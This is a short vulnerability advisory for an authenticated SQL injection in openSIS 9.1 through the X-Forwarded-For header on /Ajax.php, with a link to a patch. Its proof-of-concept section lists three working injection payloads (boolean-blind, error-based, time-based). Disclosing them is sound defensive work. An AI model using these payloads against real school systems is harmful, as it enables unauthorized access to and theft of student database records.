title: openSIS 9.1 - SQL Injection (Authenticated)
description: A SQL injection vulnerability exists in openSIS 9.1 via the 'X-Forwarded-For' header in POST requests to /Ajax.php. This allows attackers to execute arbitrary SQL queries.
impact: Unauthorized access to the database, potential data exfiltration.
remediation: Apply the patch provided in the GitHub pull request: https://github.com/OS4ED/openSIS-Classic/pull/322.
proof_of_concept:
GET /Ajax.php?modname=x HTTP/1.1

Parameter: X-Forwarded-For #1* ((custom) HEADER)
Type: boolean-based blind
Payload: 127.0.0.2' AND EXTRACTVALUE(5785,CASE WHEN (5785=5785) THEN 5785 ELSE 0x3A END) AND 'HVwG'='HVwG

Type: error-based
Payload: 127.0.0.2' AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT (ELT(5261=5261,1))),0x71716b6b71),5261) AND 'djze'='djze

Type: time-based blind
Payload: 127.0.0.2' AND (SELECT 5313 FROM (SELECT(SLEEP(5)))VeyP) AND 'ZIae'='ZIae
